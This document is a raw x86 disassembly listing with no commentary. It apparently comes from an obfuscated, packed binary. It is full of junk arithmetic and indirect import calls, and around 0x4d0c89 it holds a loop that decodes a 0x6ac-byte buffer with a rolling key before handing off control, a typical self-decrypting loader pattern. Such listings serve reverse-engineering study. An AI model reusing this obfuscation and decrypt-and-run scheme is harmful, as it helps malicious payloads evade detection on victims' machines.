  4d0799:	push   edx
  4d079a:	call   0x4d0f54
  4d079f:	add    esp,0xc
  4d07a2:	pop    edi
  4d07a3:	push   edi
  4d07a4:	mov    ebx,0x0
  4d07a9:	push   ebx
  4d07aa:	call   0x4d08c8
  4d07af:	add    esp,0x4
  4d07b2:	pop    edi
  4d07b3:	add    esp,0x44
  4d07b6:	pop    ebp
  4d07b7:	ret    
  4d07b8:	mov    edi,edi
  4d07ba:	push   ebp
  4d07bb:	mov    ebp,esp
  4d07bd:	sub    esp,0x24
  4d07c0:	mov    ebx,0x4d310c
  4d07c5:	cmp    ebx,0x75ab
  4d07cb:	je     0x4d07bb
  4d07cd:	push   ebx
  4d07ce:	push   DWORD PTR [ebx+0x1e4]
  4d07d4:	push   edx
  4d07d5:	push   edx
  4d07d6:	call   0x4d0d74
  4d07db:	add    esp,0xc
  4d07de:	pop    ebx
  4d07df:	push   0x0
  4d07e1:	call   0x4d0d20
  4d07e6:	add    esp,0x4
  4d07e9:	mov    edx,0x0
  4d07ee:	push   edx
  4d07ef:	call   0x4d0960
  4d07f4:	add    esp,0x4
  4d07f7:	add    esp,0x24
  4d07fa:	pop    ebp
  4d07fb:	ret    
  4d07fc:	mov    edi,edi
  4d07fe:	push   ebp
  4d07ff:	mov    ebp,esp
  4d0801:	sub    esp,0x60
  4d0804:	mov    edx,0x4d30a4
  4d0809:	cmp    edx,0x585f
  4d080f:	jbe    0x4d07ff
  4d0811:	push   edx
  4d0812:	push   DWORD PTR [edx+0x1e4]
  4d0818:	push   esi
  4d0819:	call   0x4d07b8
  4d081e:	add    esp,0x8
  4d0821:	pop    edx
  4d0822:	push   edx
  4d0823:	lea    eax,[edx-0xa4]
  4d0829:	push   eax
  4d082a:	call   0x4d0fe0
  4d082f:	add    esp,0x4
  4d0832:	test   eax,eax
  4d0834:	jne    0x4d0823
  4d0836:	pop    edx
  4d0837:	mov    edi,0x4d2008
  4d083c:	mov    edi,DWORD PTR [edi]
  4d083e:	push   edi
  4d083f:	push   DWORD PTR [edx+0x5c]
  4d0842:	pop    eax
  4d0843:	call   eax
  4d0845:	add    esp,0x60
  4d0848:	pop    ebp
  4d0849:	ret    
  4d084a:	add    BYTE PTR [eax],al
  4d084c:	pop    edi
  4d084d:	call   DWORD PTR ds:0x4d2000
  4d0853:	call   edi
  4d0855:	add    BYTE PTR [eax],al
  4d0857:	add    BYTE PTR [edi-0x1],bl
  4d085a:	adc    eax,0x4d205c
  4d085f:	call   edi
  4d0861:	add    BYTE PTR [eax],al
  4d0863:	add    BYTE PTR [edi-0x1],bl
  4d0866:	adc    eax,0x4d2090
  4d086b:	call   edi
  4d086d:	add    BYTE PTR [eax],al
  4d086f:	add    BYTE PTR [edi-0x1],bl
  4d0872:	adc    eax,0x4d2058
  4d0877:	call   edi
  4d0879:	add    BYTE PTR [eax],al
  4d087b:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0881:	sub    esp,0x50
  4d0884:	lea    edi,ds:0x4d3084
  4d088a:	xor    esi,DWORD PTR [ebp-0xc]
  4d088d:	push   edi
  4d088e:	push   DWORD PTR [edi+0x1dc]
  4d0894:	push   ebx
  4d0895:	push   DWORD PTR [edi+0x120]
  4d089b:	push   esi
  4d089c:	call   0x4d14d0
  4d08a1:	add    esp,0x10
  4d08a4:	pop    edi
  4d08a5:	push   edi
  4d08a6:	mov    eax,0x0
  4d08ab:	push   eax
  4d08ac:	call   0x4d12f4
  4d08b1:	add    esp,0x4
  4d08b4:	pop    edi
  4d08b5:	push   edi
  4d08b6:	push   0x0
  4d08b8:	call   0x4d0e14
  4d08bd:	add    esp,0x4
  4d08c0:	pop    edi
  4d08c1:	add    esp,0x50
  4d08c4:	pop    ebp
  4d08c5:	ret    
  4d08c6:	add    BYTE PTR [eax],al
  4d08c8:	pop    edi
  4d08c9:	call   DWORD PTR ds:0x4d2030
  4d08cf:	call   edi
  4d08d1:	add    BYTE PTR [eax],al
  4d08d3:	add    BYTE PTR [edi-0x1],bl
  4d08d6:	adc    eax,0x4d2018
  4d08db:	call   edi
  4d08dd:	add    BYTE PTR [eax],al
  4d08df:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d08e5:	sub    esp,0x2c
  4d08e8:	lea    ecx,ds:0x4d303c
  4d08ee:	and    ebx,DWORD PTR [ebp-0x14]
  4d08f1:	push   ecx
  4d08f2:	push   DWORD PTR [ecx+0x190]
  4d08f8:	push   esi
  4d08f9:	call   0x4d1074
  4d08fe:	add    esp,0x8
  4d0901:	pop    ecx
  4d0902:	push   ecx
  4d0903:	push   0x0
  4d0905:	call   0x4d0858
  4d090a:	add    esp,0x4
  4d090d:	pop    ecx
  4d090e:	push   ecx
  4d090f:	push   0x0
  4d0911:	call   0x4d08c8
  4d0916:	add    esp,0x4
  4d0919:	pop    ecx
  4d091a:	add    esp,0x2c
  4d091d:	pop    ebp
  4d091e:	ret    
  4d091f:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0925:	sub    esp,0x48
  4d0928:	lea    esi,ds:0x4d30ec
  4d092e:	or     edx,DWORD PTR [esi+0xe8]
  4d0934:	mov    edi,0x0
  4d0939:	push   edi
  4d093a:	call   0x4d0960
  4d093f:	add    esp,0x4
  4d0942:	push   esi
  4d0943:	push   ecx
  4d0944:	push   DWORD PTR [esi+0x38]
  4d0947:	call   0x4d1564
  4d094c:	add    esp,0x8
  4d094f:	pop    esi
  4d0950:	call   0x4d084c
  4d0955:	add    esp,0x4
  4d0958:	add    esp,0x48
  4d095b:	pop    ebp
  4d095c:	ret    
  4d095d:	add    BYTE PTR [eax],al
  4d095f:	add    BYTE PTR [edi-0x1],bl
  4d0962:	adc    eax,0x4d206c
  4d0967:	call   edi
  4d0969:	add    BYTE PTR [eax],al
  4d096b:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0971:	sub    esp,0x48
  4d0974:	lea    ecx,[edi-0x94]
  4d097a:	sub    DWORD PTR [ecx+0x12c],0xfffffff8
  4d0981:	push   ecx
  4d0982:	push   edi
  4d0983:	push   DWORD PTR [ecx+0x28]
  4d0986:	call   0x4d1288
  4d098b:	add    esp,0x8
  4d098e:	pop    ecx
  4d098f:	push   ecx
  4d0990:	push   0x0
  4d0992:	call   0x4d0d20
  4d0997:	add    esp,0x4
  4d099a:	pop    ecx
  4d099b:	push   ecx
  4d099c:	mov    edi,0x0
  4d09a1:	push   edi
  4d09a2:	call   0x4d0a90
  4d09a7:	add    esp,0x4
  4d09aa:	pop    ecx
  4d09ab:	add    esp,0x48
  4d09ae:	pop    ebp
  4d09af:	ret    
  4d09b0:	mov    edi,edi
  4d09b2:	push   ebp
  4d09b3:	mov    ebp,esp
  4d09b5:	sub    esp,0x2c
  4d09b8:	lea    edi,[eax-0x18c]
  4d09be:	xor    DWORD PTR [edi+0x13c],0xfffffffb
  4d09c5:	push   edi
  4d09c6:	push   0x0
  4d09c8:	call   0x4d0a90
  4d09cd:	add    esp,0x4
  4d09d0:	pop    edi
  4d09d1:	push   edi
  4d09d2:	push   DWORD PTR [edi+0xf4]
  4d09d8:	push   DWORD PTR [edi+0xac]
  4d09de:	push   DWORD PTR [edi+0x30]
  4d09e1:	push   DWORD PTR [edi+0x150]
  4d09e7:	call   0x4d1418
  4d09ec:	add    esp,0x10
  4d09ef:	pop    edi
  4d09f0:	push   edi
  4d09f1:	mov    eax,0x0
  4d09f6:	push   eax
  4d09f7:	call   0x4d0a90
  4d09fc:	add    esp,0x4
  4d09ff:	pop    edi
  4d0a00:	add    esp,0x2c
  4d0a03:	pop    ebp
  4d0a04:	ret    
  4d0a05:	add    BYTE PTR [eax],al
  4d0a07:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0a0d:	sub    esp,0x1c
  4d0a10:	lea    esi,ds:0x4d3134
  4d0a16:	sub    ecx,DWORD PTR [esi-0xec]
  4d0a1c:	push   esi
  4d0a1d:	push   ebx
  4d0a1e:	push   edx
  4d0a1f:	push   DWORD PTR [esi+0xe8]
  4d0a25:	push   DWORD PTR [esi+0x80]
  4d0a2b:	call   0x4d0ae4
  4d0a30:	add    esp,0x10
  4d0a33:	pop    esi
  4d0a34:	push   0x0
  4d0a36:	call   0x4d0f48
  4d0a3b:	add    esp,0x4
  4d0a3e:	push   0x0
  4d0a40:	call   0x4d12f4
  4d0a45:	add    esp,0x4
  4d0a48:	add    esp,0x1c
  4d0a4b:	pop    ebp
  4d0a4c:	ret    
  4d0a4d:	add    BYTE PTR [eax],al
  4d0a4f:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0a55:	sub    esp,0x58
  4d0a58:	mov    edx,0x4d3174
  4d0a5d:	or     ecx,DWORD PTR [ebp-0x34]
  4d0a60:	push   edx
  4d0a61:	push   eax
  4d0a62:	push   eax
  4d0a63:	push   DWORD PTR [edx+0x40]
  4d0a66:	push   DWORD PTR [edx+0x1a4]
  4d0a6c:	call   0x4d137c
  4d0a71:	add    esp,0x10
  4d0a74:	pop    edx
  4d0a75:	push   edx
  4d0a76:	push   0x0
  4d0a78:	call   0x4d0858
  4d0a7d:	add    esp,0x4
  4d0a80:	pop    edx
  4d0a81:	push   edx
  4d0a82:	call   0x4d0d14
  4d0a87:	add    esp,0x4
  4d0a8a:	pop    edx
  4d0a8b:	add    esp,0x58
  4d0a8e:	pop    ebp
  4d0a8f:	ret    
  4d0a90:	pop    edi
  4d0a91:	call   DWORD PTR ds:0x4d2034
  4d0a97:	call   edi
  4d0a99:	add    BYTE PTR [eax],al
  4d0a9b:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0aa1:	sub    esp,0x20
  4d0aa4:	lea    ebx,ds:0x4d3034
  4d0aaa:	xor    DWORD PTR [ebx+0x70],edx
  4d0aad:	call   0x4d0d14
  4d0ab2:	add    esp,0x4
  4d0ab5:	push   ebx
  4d0ab6:	push   DWORD PTR [ebx+0x94]
  4d0abc:	push   DWORD PTR [ebx+0x1c8]
  4d0ac2:	push   DWORD PTR [ebx+0x158]
  4d0ac8:	push   eax
  4d0ac9:	call   0x4d0730
  4d0ace:	add    esp,0x10
  4d0ad1:	pop    ebx
  4d0ad2:	push   0x0
  4d0ad4:	call   0x4d12e8
  4d0ad9:	add    esp,0x4
  4d0adc:	add    esp,0x20
  4d0adf:	pop    ebp
  4d0ae0:	ret    
  4d0ae1:	add    BYTE PTR [eax],al
  4d0ae3:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0ae9:	sub    esp,0x3c
  4d0aec:	lea    edx,ds:0x4d3168
  4d0af2:	adc    eax,DWORD PTR [ebp-0x14]
  4d0af5:	push   edx
  4d0af6:	call   0x4d084c
  4d0afb:	add    esp,0x4
  4d0afe:	pop    edx
  4d0aff:	push   edx
  4d0b00:	push   ecx
  4d0b01:	push   DWORD PTR [edx+0xd0]
  4d0b07:	call   0x4d0ef8
  4d0b0c:	add    esp,0x8
  4d0b0f:	pop    edx
  4d0b10:	push   edx
  4d0b11:	call   0x4d084c
  4d0b16:	add    esp,0x4
  4d0b19:	pop    edx
  4d0b1a:	add    esp,0x3c
  4d0b1d:	pop    ebp
  4d0b1e:	ret    
  4d0b1f:	add    BYTE PTR [edi-0x1],bl
  4d0b22:	adc    eax,0x4d2060
  4d0b27:	call   edi
  4d0b29:	add    BYTE PTR [eax],al
  4d0b2b:	add    BYTE PTR [edi-0x1],bl
  4d0b2e:	adc    eax,0x4d2028
  4d0b33:	call   edi
  4d0b35:	add    BYTE PTR [eax],al
  4d0b37:	add    BYTE PTR [edi-0x1],bl
  4d0b3a:	adc    eax,0x4d2010
  4d0b3f:	call   edi
  4d0b41:	add    BYTE PTR [eax],al
  4d0b43:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0b49:	sub    esp,0x5c
  4d0b4c:	mov    ecx,0x4d3040
  4d0b51:	mov    eax,DWORD PTR [ebp-0x28]
  4d0b54:	push   ecx
  4d0b55:	push   edx
  4d0b56:	push   DWORD PTR [ecx+0x24]
  4d0b59:	push   DWORD PTR [ecx+0x160]
  4d0b5f:	call   0x4d0e74
  4d0b64:	add    esp,0xc
  4d0b67:	pop    ecx
  4d0b68:	push   ecx
  4d0b69:	call   0x4d0d14
  4d0b6e:	add    esp,0x4
  4d0b71:	pop    ecx
  4d0b72:	push   ecx
  4d0b73:	mov    ebx,0x0
  4d0b78:	push   ebx
  4d0b79:	call   0x4d14b8
  4d0b7e:	add    esp,0x4
  4d0b81:	pop    ecx
  4d0b82:	add    esp,0x5c
  4d0b85:	pop    ebp
  4d0b86:	ret    
  4d0b87:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0b8d:	sub    esp,0x2c
  4d0b90:	lea    esi,ds:0x4d3100
  4d0b96:	xor    eax,DWORD PTR [esi+0x48]
  4d0b99:	push   esi
  4d0b9a:	push   DWORD PTR [esi+0x170]
  4d0ba0:	push   ebx
  4d0ba1:	push   DWORD PTR [esi+0x1dc]
  4d0ba7:	call   0x4d0a9c
  4d0bac:	add    esp,0xc
  4d0baf:	pop    esi
  4d0bb0:	push   0xfffffff4
  4d0bb2:	call   0x4d0b2c
  4d0bb7:	add    esp,0x4
  4d0bba:	push   0x0
  4d0bbc:	call   0x4d08c8
  4d0bc1:	add    esp,0x4
  4d0bc4:	add    esp,0x2c
  4d0bc7:	pop    ebp
  4d0bc8:	ret    
  4d0bc9:	add    BYTE PTR [eax],al
  4d0bcb:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0bd1:	sub    esp,0x48
  4d0bd4:	lea    ecx,[ebx-0x18]
  4d0bd7:	adc    DWORD PTR [ebp-0x18],edx
  4d0bda:	push   ecx
  4d0bdb:	mov    edi,0x0
  4d0be0:	push   edi
  4d0be1:	call   0x4d0a90
  4d0be6:	add    esp,0x4
  4d0be9:	pop    ecx
  4d0bea:	push   ecx
  4d0beb:	push   edi
  4d0bec:	push   DWORD PTR [ecx+0x188]
  4d0bf2:	push   DWORD PTR [ecx+0x19c]
  4d0bf8:	push   esi
  4d0bf9:	call   0x4d0a50
  4d0bfe:	add    esp,0x10
  4d0c01:	pop    ecx
  4d0c02:	push   ecx
  4d0c03:	push   0x0
  4d0c05:	call   0x4d12e8
  4d0c0a:	add    esp,0x4
  4d0c0d:	pop    ecx
  4d0c0e:	add    esp,0x48
  4d0c11:	pop    ebp
  4d0c12:	ret    
  4d0c13:	add    BYTE PTR [edi-0x1],bl
  4d0c16:	adc    eax,0x4d207c
  4d0c1b:	call   edi
  4d0c1d:	add    BYTE PTR [eax],al
  4d0c1f:	add    BYTE PTR [edi+0x2b],dl
  4d0c22:	call   DWORD PTR [edi+0x57]
  4d0c25:	push   edi
  4d0c26:	push   edi
  4d0c27:	call   0x4d0c68
  4d0c2c:	sub    esp,0xfffffffc
  4d0c2f:	call   0x4d0b38
  4d0c34:	push   0x2
  4d0c36:	xor    eax,eax
  4d0c38:	dec    eax
  4d0c39:	and    eax,0x4d3030
  4d0c3e:	push   0x0
  4d0c40:	lea    ecx,[eax+0x6]
  4d0c43:	add    BYTE PTR [ecx],0x41
  4d0c46:	push   eax
  4d0c47:	call   0x4d1300
  4d0c4c:	pop    edi
  4d0c4d:	pop    edi
  4d0c4e:	pop    edi
  4d0c4f:	lea    edi,[eax+0x3b]
  4d0c52:	mov    edi,DWORD PTR [edi]
  4d0c54:	lea    eax,[eax+edi*1]
  4d0c57:	mov    eax,DWORD PTR [eax+0x28]
  4d0c5a:	pusha  
  4d0c5b:	mov    ah,0x45
  4d0c5d:	sub    al,ah
  4d0c5f:	ja     0x4d07fc
  4d0c65:	popa   
  4d0c66:	ret    
  4d0c67:	add    BYTE PTR [edi-0x1],bl
  4d0c6a:	adc    eax,0x4d2020
  4d0c6f:	call   edi
  4d0c71:	add    BYTE PTR [eax],al
  4d0c73:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0c79:	sub    esp,0x24
  4d0c7c:	add    DWORD PTR [edx+0xf0],edx
  4d0c82:	lea    edi,ds:0x4d318c
  4d0c88:	push   edi
  4d0c89:	mov    ecx,0x6ac
  4d0c8e:	push   ecx
  4d0c8f:	mov    eax,0x6ac
  4d0c94:	push   eax
  4d0c95:	mov    edi,0x40001
  4d0c9a:	push   edi
  4d0c9b:	mov    ecx,0x862985b2
  4d0ca0:	push   DWORD PTR [ecx+0x7a239a86]
  4d0ca6:	sub    DWORD PTR [esp],0x2
  4d0caa:	mov    ecx,0x4d2040
  4d0caf:	pop    DWORD PTR [ecx]
  4d0cb1:	call   0x4d1300
  4d0cb6:	add    esp,0x4
  4d0cb9:	xchg   DWORD PTR [esp],eax
  4d0cbc:	mov    edi,eax
  4d0cbe:	pop    DWORD PTR [edi-0x8c]
  4d0cc4:	mov    ecx,DWORD PTR [edi-0x8c]
  4d0cca:	mov    eax,ecx
  4d0ccc:	sub    ecx,ecx
  4d0cce:	dec    ecx
  4d0ccf:	and    ecx,0x4d0014
  4d0cd5:	mov    ebx,0xd5d9a824
  4d0cda:	xor    edx,edx
  4d0cdc:	cmp    edx,0x6ac
  4d0ce2:	je     0x4d0d00
  4d0ce4:	sub    edx,0xfffffffc
  4d0ce7:	xor    esi,esi
  4d0ce9:	push   DWORD PTR [ecx+esi*1]
  4d0cec:	add    DWORD PTR [esp],ebx
  4d0cef:	pop    DWORD PTR [eax+esi*2]
  4d0cf2:	dec    DWORD PTR [eax]
  4d0cf4:	xor    ebx,ebx
  4d0cf6:	add    ebx,DWORD PTR [ecx]
  4d0cf8:	add    ecx,0x4
  4d0cfb:	add    eax,0x4
  4d0cfe:	jmp    0x4d0cdc
  4d0d00:	push   edi
  4d0d01:	push   0x0
  4d0d03:	call   0x4d08c8
  4d0d08:	add    esp,0x4
  4d0d0b:	pop    edi
  4d0d0c:	add    esp,0x24
  4d0d0f:	pop    ebp
  4d0d10:	ret    
  4d0d11:	add    BYTE PTR [eax],al
  4d0d13:	add    BYTE PTR [edi-0x1],bl
  4d0d16:	adc    eax,0x4d2024
  4d0d1b:	call   edi
  4d0d1d:	add    BYTE PTR [eax],al
  4d0d1f:	add    BYTE PTR [edi-0x1],bl
  4d0d22:	adc    eax,0x4d202c
  4d0d27:	call   edi
  4d0d29:	add    BYTE PTR [eax],al
  4d0d2b:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0d31:	sub    esp,0x40
  4d0d34:	lea    eax,ds:0x4d3008
  4d0d3a:	sub    esi,ebx
  4d0d3c:	push   eax
  4d0d3d:	push   DWORD PTR [eax+0x54]
  4d0d40:	push   DWORD PTR [eax+0x190]
  4d0d46:	push   edx
  4d0d47:	push   edi
  4d0d48:	call   0x4d0fec
  4d0d4d:	add    esp,0x10
  4d0d50:	pop    eax
  4d0d51:	push   eax
  4d0d52:	mov    ebx,0x0
  4d0d57:	push   ebx
  4d0d58:	call   0x4d0f48
  4d0d5d:	add    esp,0x4
  4d0d60:	pop    eax
  4d0d61:	push   eax
  4d0d62:	push   0x0
  4d0d64:	call   0x4d0d20
  4d0d69:	add    esp,0x4
  4d0d6c:	pop    eax
  4d0d6d:	add    esp,0x40
  4d0d70:	pop    ebp
  4d0d71:	ret    
  4d0d72:	add    BYTE PTR [eax],al
  4d0d74:	mov    edi,edi
  4d0d76:	push   ebp
  4d0d77:	mov    ebp,esp
  4d0d79:	sub    esp,0x28
  4d0d7c:	mov    edx,0x4d3084
  4d0d81:	cmp    edx,0x707b
  4d0d87:	jbe    0x4d0d77
  4d0d89:	push   edx
  4d0d8a:	mov    ebx,0x0
  4d0d8f:	push   ebx
  4d0d90:	call   0x4d08c8
  4d0d95:	add    esp,0x4
  4d0d98:	pop    edx
  4d0d99:	push   edx
  4d0d9a:	push   DWORD PTR [edx+0x84]
  4d0da0:	push   DWORD PTR [edx+0xd4]
  4d0da6:	push   DWORD PTR [edx+0x7c]
  4d0da9:	call   0x4d087c
  4d0dae:	add    esp,0xc
  4d0db1:	pop    edx
  4d0db2:	push   edx
  4d0db3:	push   0x0
  4d0db5:	call   0x4d12f4
  4d0dba:	add    esp,0x4
  4d0dbd:	pop    edx
  4d0dbe:	add    esp,0x28
  4d0dc1:	pop    ebp
  4d0dc2:	ret    
  4d0dc3:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0dc9:	sub    esp,0x40
  4d0dcc:	lea    esi,ds:0x4d305c
  4d0dd2:	adc    eax,DWORD PTR [esi+0x184]
  4d0dd8:	push   0xfffffff4
  4d0dda:	call   0x4d0b2c
  4d0ddf:	add    esp,0x4
  4d0de2:	push   esi
  4d0de3:	push   DWORD PTR [esi+0xdc]
  4d0de9:	push   DWORD PTR [esi+0xe8]
  4d0def:	push   eax
  4d0df0:	push   DWORD PTR [esi+0xc0]
  4d0df6:	call   0x4d1158
  4d0dfb:	add    esp,0x10
  4d0dfe:	pop    esi
  4d0dff:	mov    edi,0x0
  4d0e04:	push   edi
  4d0e05:	call   0x4d0960
  4d0e0a:	add    esp,0x4
  4d0e0d:	add    esp,0x40
  4d0e10:	pop    ebp
  4d0e11:	ret    
  4d0e12:	add    BYTE PTR [eax],al
  4d0e14:	pop    edi
  4d0e15:	call   DWORD PTR ds:0x4d201c
  4d0e1b:	call   edi
  4d0e1d:	add    BYTE PTR [eax],al
  4d0e1f:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0e25:	sub    esp,0x5c
  4d0e28:	mov    edi,0x4d30ec
  4d0e2d:	add    eax,0x42a2
  4d0e32:	push   edi
  4d0e33:	push   eax
  4d0e34:	push   DWORD PTR [edi+0x10]
  4d0e37:	push   DWORD PTR [edi+0x1ac]
  4d0e3d:	call   0x4d1238
  4d0e42:	add    esp,0xc
  4d0e45:	pop    edi
  4d0e46:	push   edi
  4d0e47:	push   0x0
  4d0e49:	call   0x4d14b8
  4d0e4e:	add    esp,0x4
  4d0e51:	pop    edi
  4d0e52:	push   edi
  4d0e53:	mov    eax,0xfffffff4
  4d0e58:	push   eax
  4d0e59:	call   0x4d0b2c
  4d0e5e:	add    esp,0x4
  4d0e61:	pop    edi
  4d0e62:	add    esp,0x5c
  4d0e65:	pop    ebp
  4d0e66:	ret    
  4d0e67:	add    BYTE PTR [edi-0x1],bl
  4d0e6a:	adc    eax,0x4d2068
  4d0e6f:	call   edi
  4d0e71:	add    BYTE PTR [eax],al
  4d0e73:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0e79:	sub    esp,0x44
  4d0e7c:	lea    eax,ds:0x4d31fc
  4d0e82:	mov    edi,0xffffffa4
  4d0e87:	push   eax
  4d0e88:	call   0x4d084c
  4d0e8d:	add    esp,0x4
  4d0e90:	pop    eax
  4d0e91:	push   eax
  4d0e92:	push   esi
  4d0e93:	push   DWORD PTR [eax+0x1a0]
  4d0e99:	call   0x4d06ec
  4d0e9e:	add    esp,0x8
  4d0ea1:	pop    eax
  4d0ea2:	push   eax
  4d0ea3:	lea    ebx,[eax-0x1fc]
  4d0ea9:	push   ebx
  4d0eaa:	call   0x4d0fe0
  4d0eaf:	add    esp,0x4
  4d0eb2:	test   eax,eax
  4d0eb4:	jne    0x4d0ea3
  4d0eb6:	pop    eax
  4d0eb7:	add    esp,0x44
  4d0eba:	pop    ebp
  4d0ebb:	ret    
  4d0ebc:	mov    edi,edi
  4d0ebe:	push   ebp
  4d0ebf:	mov    ebp,esp
  4d0ec1:	sub    esp,0x20
  4d0ec4:	mov    esi,0x4d31d8
  4d0ec9:	mov    edi,DWORD PTR [ebp-0x4]
  4d0ecc:	push   esi
  4d0ecd:	push   ecx
  4d0ece:	push   DWORD PTR [esi+0x170]
  4d0ed4:	push   ebx
  4d0ed5:	call   0x4d13e4
  4d0eda:	add    esp,0xc
  4d0edd:	pop    esi
  4d0ede:	push   0x0
  4d0ee0:	call   0x4d0960
  4d0ee5:	add    esp,0x4
  4d0ee8:	call   0x4d0d14
  4d0eed:	add    esp,0x4
  4d0ef0:	add    esp,0x20
  4d0ef3:	pop    ebp
  4d0ef4:	ret    
  4d0ef5:	add    BYTE PTR [eax],al
  4d0ef7:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0efd:	sub    esp,0x5c
  4d0f00:	lea    edi,[edx-0x13c]
  4d0f06:	add    DWORD PTR [ebp-0x5c],esi
  4d0f09:	push   edi
  4d0f0a:	push   DWORD PTR [edi+0x94]
  4d0f10:	push   edx
  4d0f11:	push   edx
  4d0f12:	call   0x4d1470
  4d0f17:	add    esp,0xc
  4d0f1a:	pop    edi
  4d0f1b:	push   edi
  4d0f1c:	push   0x0
  4d0f1e:	call   0x4d0a90
  4d0f23:	add    esp,0x4
  4d0f26:	pop    edi
  4d0f27:	push   edi
  4d0f28:	mov    ebx,0x0
  4d0f2d:	push   ebx
  4d0f2e:	call   0x4d0960
  4d0f33:	add    esp,0x4
  4d0f36:	pop    edi
  4d0f37:	add    esp,0x5c
  4d0f3a:	pop    ebp
  4d0f3b:	ret    
  4d0f3c:	pop    edi
  4d0f3d:	call   DWORD PTR ds:0x4d2088
  4d0f43:	call   edi
  4d0f45:	add    BYTE PTR [eax],al
  4d0f47:	add    BYTE PTR [edi-0x1],bl
  4d0f4a:	adc    eax,0x4d2004
  4d0f4f:	call   edi
  4d0f51:	add    BYTE PTR [eax],al
  4d0f53:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0f59:	sub    esp,0x48
  4d0f5c:	lea    ecx,ds:0x4d3108
  4d0f62:	sbb    edx,edi
  4d0f64:	push   ecx
  4d0f65:	push   DWORD PTR [ecx+0x1fc]
  4d0f6b:	push   DWORD PTR [ecx+0x118]
  4d0f71:	call   0x4d0e20
  4d0f76:	add    esp,0x8
  4d0f79:	pop    ecx
  4d0f7a:	push   ecx
  4d0f7b:	mov    esi,0x0
  4d0f80:	push   esi
  4d0f81:	call   0x4d08c8
  4d0f86:	add    esp,0x4
  4d0f89:	pop    ecx
  4d0f8a:	push   ecx
  4d0f8b:	push   0x0
  4d0f8d:	call   0x4d0e14
  4d0f92:	add    esp,0x4
  4d0f95:	pop    ecx
  4d0f96:	add    esp,0x48
  4d0f99:	pop    ebp
  4d0f9a:	ret    
  4d0f9b:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0fa1:	sub    esp,0x48
  4d0fa4:	lea    edx,ds:0x4d3014
  4d0faa:	or     DWORD PTR [edx+0x34],eax
  4d0fad:	push   edx
  4d0fae:	call   0x4d084c
  4d0fb3:	add    esp,0x4
  4d0fb6:	pop    edx
  4d0fb7:	push   edx
  4d0fb8:	push   DWORD PTR [edx+0x1c8]
  4d0fbe:	push   ebx
  4d0fbf:	push   DWORD PTR [edx+0xf0]
  4d0fc5:	push   esi
  4d0fc6:	call   0x4d0920
  4d0fcb:	add    esp,0x10
  4d0fce:	pop    edx
  4d0fcf:	push   edx
  4d0fd0:	push   0xfffffff4
  4d0fd2:	call   0x4d0b2c
  4d0fd7:	add    esp,0x4
  4d0fda:	pop    edx
  4d0fdb:	add    esp,0x48
  4d0fde:	pop    ebp
  4d0fdf:	ret    
  4d0fe0:	pop    edi
  4d0fe1:	call   DWORD PTR ds:0x4d2008
  4d0fe7:	call   edi
  4d0fe9:	add    BYTE PTR [eax],al
  4d0feb:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0ff1:	sub    esp,0x40
  4d0ff4:	lea    edx,ds:0x4d305c
  4d0ffa:	add    DWORD PTR [edx+0xfc],eax
  4d1000:	push   edx
  4d1001:	push   ebx
  4d1002:	push   DWORD PTR [edx+0x6c]
  4d1005:	push   esi
  4d1006:	push   eax
  4d1007:	call   0x4d0ebc
  4d100c:	add    esp,0x10
  4d100f:	pop    edx
  4d1010:	push   edx
  4d1011:	mov    esi,0x0
  4d1016:	push   esi
  4d1017:	call   0x4d0960
  4d101c:	add    esp,0x4
  4d101f:	pop    edx
  4d1020:	push   edx
  4d1021:	push   0x0
  4d1023:	call   0x4d0960
  4d1028:	add    esp,0x4
  4d102b:	pop    edx
  4d102c:	add    esp,0x40
  4d102f:	pop    ebp
  4d1030:	ret    
  4d1031:	add    BYTE PTR [eax],al
  4d1033:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d1039:	sub    esp,0x50
  4d103c:	lea    edi,[ebx+0x14]
  4d103f:	add    ecx,edx
  4d1041:	push   edi
  4d1042:	push   DWORD PTR [edi+0xe4]
  4d1048:	push   eax
  4d1049:	push   DWORD PTR [edi+0xe0]
  4d104f:	call   0x4d1324
  4d1054:	add    esp,0xc
  4d1057:	pop    edi
  4d1058:	push   edi
  4d1059:	push   0x0
  4d105b:	call   0x4d12e8
  4d1060:	add    esp,0x4
  4d1063:	pop    edi
  4d1064:	push   edi
  4d1065:	call   0x4d084c
  4d106a:	add    esp,0x4
  4d106d:	pop    edi
  4d106e:	add    esp,0x50
  4d1071:	pop    ebp
  4d1072:	ret    
  4d1073:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d1079:	sub    esp,0x4c
  4d107c:	lea    eax,ds:0x4d31a8
  4d1082:	mov    DWORD PTR [ebp-0x48],ecx
  4d1085:	push   eax
  4d1086:	push   0x0
  4d1088:	call   0x4d0960
  4d108d:	add    esp,0x4
  4d1090:	pop    eax
  4d1091:	push   eax
  4d1092:	push   edi
  4d1093:	push   DWORD PTR [eax+0x1f8]
  4d1099:	call   0x4d09b0
  4d109e:	add    esp,0x8
  4d10a1:	pop    eax
  4d10a2:	push   eax
  4d10a3:	push   0x0
  4d10a5:	call   0x4d0858
  4d10aa:	add    esp,0x4
  4d10ad:	pop    eax
  4d10ae:	add    esp,0x4c
  4d10b1:	pop    ebp
  4d10b2:	ret    
  4d10b3:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d10b9:	sub    esp,0x30
  4d10bc:	mov    ecx,0x4d316c
  4d10c1:	xor    DWORD PTR [ecx-0x144],0xffffbd16
  4d10cb:	push   ecx
  4d10cc:	call   0x4d084c
  4d10d1:	add    esp,0x4
